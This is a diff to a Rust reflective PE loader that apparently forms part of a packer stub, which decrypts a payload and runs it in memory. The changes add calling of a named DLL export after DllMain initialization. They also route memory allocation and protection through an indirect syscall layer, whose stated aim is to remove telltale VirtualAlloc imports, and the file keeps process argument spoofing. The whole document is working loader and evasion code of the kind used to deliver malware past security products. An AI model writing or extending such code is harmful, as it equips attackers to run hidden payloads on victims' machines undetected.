@@ -1,16 +1,16 @@
 // --- Reflective loading (technique fragment) ---
 
-use std::ffi::c_void;
+use std::ffi::{c_void, CStr};
 use std::ptr;
 
 use windows::Win32::Foundation::{CloseHandle, GetLastError, BOOL, HINSTANCE};
 use windows::Win32::System::Diagnostics::Debug::{
-    IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_DIRECTORY_ENTRY_TLS,
-    IMAGE_FILE_DLL, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
+    IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_DIRECTORY_ENTRY_IMPORT,
+    IMAGE_DIRECTORY_ENTRY_TLS, IMAGE_FILE_DLL, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
 };
 use windows::Win32::System::Memory::{
-    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
-    PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READONLY, PAGE_READWRITE,
+    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READONLY,
+    PAGE_READWRITE,
 };
 use windows::Win32::System::SystemServices::{
     DLL_PROCESS_ATTACH, IMAGE_BASE_RELOCATION, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE,
@@ -18,7 +18,7 @@ use windows::Win32::System::SystemServices::{
     IMAGE_REL_BASED_HIGHLOW, IMAGE_REL_BASED_LOW, IMAGE_TLS_DIRECTORY64, PIMAGE_TLS_CALLBACK,
 };
 use windows::Win32::System::Threading::{
-    CreateThread, GetExitCodeThread, WaitForSingleObject, THREAD_CREATION_FLAGS,
+    CreateThread, GetCurrentProcess, GetExitCodeThread, WaitForSingleObject, THREAD_CREATION_FLAGS,
 };
 
 /// Entry point signature of a mapped EXE (returns the process exit code).
@@ -50,6 +50,9 @@ enum ReflectiveLoadingError {
     VirtualProtectFailed { section: String, error: u32 },
     #[error("could not create execution thread (error {0})")]
     ThreadCreationFailed(u32),
+    /// `build.payload.export` names a symbol the payload does not export.
+    #[error("the payload does not export '{name}'")]
+    ExportNotFound { name: String },
 }
 
 /// A base relocation entry (type + offset packed in a `u16`).
@@ -100,11 +103,19 @@ unsafe extern "system" fn entry_trampoline(ctx: *mut c_void) -> u32 {
 /// Reflectively loads `payload` in the current process and returns the exit
 /// code of its entry point.
 ///
+/// When `export` is set (`build.payload.export`, only meaningful for
+/// `format: dll`), that exported function is called instead of the image's
+/// entry point: a mapped DLL's `DllMain` only initializes the library, so a
+/// named export is how a DLL payload does real work.
+///
 /// # Safety
 /// `payload` must point to a valid, readable x64 PE image for the whole call.
 /// The payload is executed in-process, so its code runs with the stub's
 /// privileges.
-pub unsafe fn run_reflective(payload: &[u8]) -> Result<i32, ReflectiveLoadingError> {
+pub unsafe fn run_reflective(
+    payload: &[u8],
+    export: Option<&str>,
+) -> Result<i32, ReflectiveLoadingError> {
     let (_dos, nt) = get_headers(payload)?;
     let is_dll = (*nt).FileHeader.Characteristics.0 & IMAGE_FILE_DLL.0 != 0;
 
@@ -115,6 +126,23 @@ pub unsafe fn run_reflective(payload: &[u8]) -> Result<i32, ReflectiveLoadingErr
     fix_relocations(image_base, nt)?;
     fix_memory_protections(image_base, nt)?;
     execute_tls_callbacks(image_base, nt)?;
+
+    if let Some(name) = export {
+        // Initialize the library first: a mapped DLL's CRT/global constructors
+        // run from `DllMain(DLL_PROCESS_ATTACH)`, which the OS loader would
+        // normally call. Skipping it leaves an export that touches the CRT
+        // running against uninitialized state.
+        if is_dll {
+            call_dll_main(image_base, nt);
+        }
+        let address = resolve_export(image_base, nt, name)
+            .ok_or_else(|| ReflectiveLoadingError::ExportNotFound {
+                name: name.to_string(),
+            })?;
+        call_export(address);
+        return Ok(0);
+    }
+
     execute_entrypoint(image_base, nt, is_dll)
 }
 
@@ -149,25 +177,41 @@ fn get_headers(
 }
 
 /// Allocates the image at its preferred base (falling back to any address).
+/// The allocation goes through the syscall layer's `nt_alloc_vm`, so
+/// `mode: indirect` removes the `VirtualAlloc` import.
 fn allocate_image(nt: *const IMAGE_NT_HEADERS64) -> Result<*mut c_void, ReflectiveLoadingError> {
     unsafe {
         let size = (*nt).OptionalHeader.SizeOfImage as usize;
         let preferred = (*nt).OptionalHeader.ImageBase as usize;
 
-        let mut address = VirtualAlloc(
-            Some(preferred as *const c_void),
-            size,
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE,
+        let process = GetCurrentProcess();
+        let mut base = preferred as *mut c_void;
+        let mut region = size;
+        let mut status = crate::nt_alloc_vm(
+            process,
+            &mut base,
+            0,
+            &mut region,
+            MEM_COMMIT.0 | MEM_RESERVE.0,
+            PAGE_READWRITE.0,
         );
-        if address.is_null() {
-            address = VirtualAlloc(None, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if status < 0 {
+            base = ptr::null_mut();
+            region = size;
+            status = crate::nt_alloc_vm(
+                process,
+                &mut base,
+                0,
+                &mut region,
+                MEM_COMMIT.0 | MEM_RESERVE.0,
+                PAGE_READWRITE.0,
+            );
         }
-        if address.is_null() {
-            return Err(ReflectiveLoadingError::AllocateFailed(GetLastError().0));
+        if status < 0 {
+            return Err(ReflectiveLoadingError::AllocateFailed(status as u32));
         }
 
-        Ok(address)
+        Ok(base)
     }
 }
 
@@ -338,13 +382,20 @@ fn fix_memory_protections(
                 (image_base as usize + (*section).VirtualAddress as usize) as *const c_void;
             let size = (*section).Misc.VirtualSize as usize;
             if size > 0 {
-                let mut old = PAGE_PROTECTION_FLAGS(0);
-                VirtualProtect(address, size, protection, &mut old).map_err(|_| {
-                    ReflectiveLoadingError::VirtualProtectFailed {
+                let mut old = 0u32;
+                let status = crate::nt_protect_vm(
+                    GetCurrentProcess(),
+                    address as *mut core::ffi::c_void,
+                    size,
+                    protection.0,
+                    &mut old,
+                );
+                if status < 0 {
+                    return Err(ReflectiveLoadingError::VirtualProtectFailed {
                         section: section_name(section),
-                        error: GetLastError().0,
-                    }
-                })?;
+                        error: status as u32,
+                    });
+                }
             }
         }
     }
@@ -415,6 +466,83 @@ fn execute_entrypoint(
     }
 }
 
+/// The export directory, as laid out in the mapped image. Defined by hand so
+/// the fragment does not depend on the `windows` crate exposing it.
+#[repr(C)]
+struct ExportDirectory {
+    characteristics: u32,
+    timestamp: u32,
+    major_version: u16,
+    minor_version: u16,
+    name: u32,
+    base: u32,
+    number_of_functions: u32,
+    number_of_names: u32,
+    address_of_functions: u32,
+    address_of_names: u32,
+    address_of_name_ordinals: u32,
+}
+
+/// Resolves an exported symbol by name in an already-mapped image (RVA ==
+/// offset from `image_base`).
+fn resolve_export(
+    image_base: *mut c_void,
+    nt: *const IMAGE_NT_HEADERS64,
+    wanted: &str,
+) -> Option<usize> {
+    unsafe {
+        let dir = (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT.0 as usize];
+        if dir.VirtualAddress == 0 || dir.Size == 0 {
+            return None;
+        }
+
+        let base = image_base as usize;
+        let export = (base + dir.VirtualAddress as usize) as *const ExportDirectory;
+        let names = (base + (*export).address_of_names as usize) as *const u32;
+        let functions = (base + (*export).address_of_functions as usize) as *const u32;
+        let ordinals = (base + (*export).address_of_name_ordinals as usize) as *const u16;
+
+        for i in 0..(*export).number_of_names as usize {
+            let name_rva = *names.add(i);
+            let name_ptr = (base + name_rva as usize) as *const i8;
+            if CStr::from_ptr(name_ptr).to_bytes() == wanted.as_bytes() {
+                let ordinal = *ordinals.add(i) as usize;
+                return Some(base + *functions.add(ordinal) as usize);
+            }
+        }
+        None
+    }
+}
+
+/// Calls an exported function that takes no arguments.
+fn call_export(address: usize) {
+    // SAFETY: `address` is an exported function inside the mapped payload. The
+    // export is invoked with no arguments; payloads that need run-time arguments
+    // are out of scope (see the technique README).
+    let entry: unsafe extern "system" fn() = unsafe { std::mem::transmute(address) };
+    unsafe { entry() };
+}
+
+/// Runs the mapped DLL's entry point once with `DLL_PROCESS_ATTACH`, the way
+/// the loader would, so the payload's CRT and global constructors initialize
+/// before an export is called.
+fn call_dll_main(image_base: *mut c_void, nt: *const IMAGE_NT_HEADERS64) {
+    unsafe {
+        let entry = image_base as usize + (*nt).OptionalHeader.AddressOfEntryPoint as usize;
+        if entry == image_base as usize {
+            return;
+        }
+        // SAFETY: `entry` is the mapped image's entry point, copied into
+        // executable memory with matching ABI (`DllMain`).
+        let dll_main: DllEntryPoint = unsafe { std::mem::transmute(entry) };
+        let _ = dll_main(
+            HINSTANCE(image_base as *mut c_void),
+            DLL_PROCESS_ATTACH,
+            ptr::null_mut(),
+        );
+    }
+}
+
 /// Adapter expected by the stub skeleton (`run()` calls this with the
 /// decrypted payload).
 fn execute_payload(image: &mut [u8]) -> Result<i32, String> {
@@ -423,6 +551,8 @@ fn execute_payload(image: &mut [u8]) -> Result<i32, String> {
     // args>` first, so the payload receives its arguments instead of the
     // stub's own command line (process argument spoofing).
     crate::patch_command_line()?;
+    // `build.payload.export`: a DLL export to call instead of the entry point.
+    let export: Option<String> = $DLL_EXPORT_DEF$;
     // SAFETY: `image` is the decrypted, valid x64 PE produced by the packer.
-    unsafe { run_reflective(image) }.map_err(|e| e.to_string())
+    unsafe { run_reflective(image, export.as_deref()) }.map_err(|e| e.to_string())
 }
